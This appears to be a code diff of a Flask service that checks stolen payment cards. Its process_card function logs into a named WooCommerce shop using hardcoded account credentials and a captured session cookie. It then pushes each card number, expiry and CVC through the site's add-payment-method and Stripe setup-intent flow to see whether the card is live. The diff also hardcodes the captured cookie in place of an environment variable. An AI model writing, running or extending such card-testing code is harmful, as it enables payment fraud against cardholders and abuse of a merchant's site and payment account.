@@ -6,16 +6,13 @@ import os
 
 app = Flask(__name__)
 
-# Configuration from environment variables
 API_KEY = os.environ.get('API_KEY', 'yashikaaa')
 PORT = int(os.environ.get('PORT', 8080))
 
-# Working credentials from your capture
 USERNAME = os.environ.get('USERNAME', 'jflpw@hi2.in')
 PASSWORD = os.environ.get('PASSWORD', 'jflpw@hi2.in')
 LOGIN_NONCE = os.environ.get('LOGIN_NONCE', '0cd1c0ce87')
 
-# Base cookies
 BASE_COOKIES = {
     'wmc_ip_info': 'eyJjb3VudHJ5IjoiSU4iLCJjdXJyZW5jeV9jb2RlIjoiSU5SIn0%3D',
     'wmc_current_currency': 'INR',
@@ -26,8 +23,6 @@ BASE_COOKIES = {
 }
 
 def process_card(card_number, mm, yy, cvc):
-    """Process a single card and return result"""
-    
     if len(yy) == 4:
         yy = yy[2:4]
     
@@ -41,7 +36,6 @@ def process_card(card_number, mm, yy, cvc):
     }
     
     try:
-        # Step 1: Login
         login_data = {
             'username': USERNAME,
             'password': PASSWORD,
@@ -57,9 +51,8 @@ def process_card(card_number, mm, yy, cvc):
         if 'wordpress_logged_in_91ca41e7d59f3a1afa890c4675c6caa7' in login_response.cookies:
             cookies['wordpress_logged_in_91ca41e7d59f3a1afa890c4675c6caa7'] = login_response.cookies['wordpress_logged_in_91ca41e7d59f3a1afa890c4675c6caa7']
         else:
-            cookies['wordpress_logged_in_91ca41e7d59f3a1afa890c4675c6caa7'] = os.environ.get('WP_COOKIE', 'jflpw%40hi2.in%7C1776847107%7CpYGEnoiGg3k0BmdE0XqMFAfDomJAfD2VQMpbkl046gQ%7C90c35a5f05eb6916600614b838b2df37ebe5182b3ade661f6370a0259d592fa2')
+            cookies['wordpress_logged_in_91ca41e7d59f3a1afa890c4675c6caa7'] = 'jflpw%40hi2.in%7C1776847107%7CpYGEnoiGg3k0BmdE0XqMFAfDomJAfD2VQMpbkl046gQ%7C90c35a5f05eb6916600614b838b2df37ebe5182b3ade661f6370a0259d592fa2'
         
-        # Step 2: Get nonce
         page_response = requests.get('https://hakfabrications.com/my-account/add-payment-method/', 
                                       cookies=cookies, headers=headers, timeout=30)
         
@@ -80,7 +73,6 @@ def process_card(card_number, mm, yy, cvc):
         else:
             cookies['__stripe_sid'] = 'e99ec91e-fbc8-47a3-afcc-421fe9ea9ff74b630a'
         
-        # Step 3: Create Stripe payment method
         stripe_headers = {
             'authority': 'api.stripe.com',
             'accept': 'application/json',
@@ -113,7 +105,6 @@ def process_card(card_number, mm, yy, cvc):
         
         payment_id = stripe_result['id']
         
-        # Step 4: Confirm setup intent
         ajax_headers = {
             'authority': 'hakfabrications.com',
             'accept': '*/*',
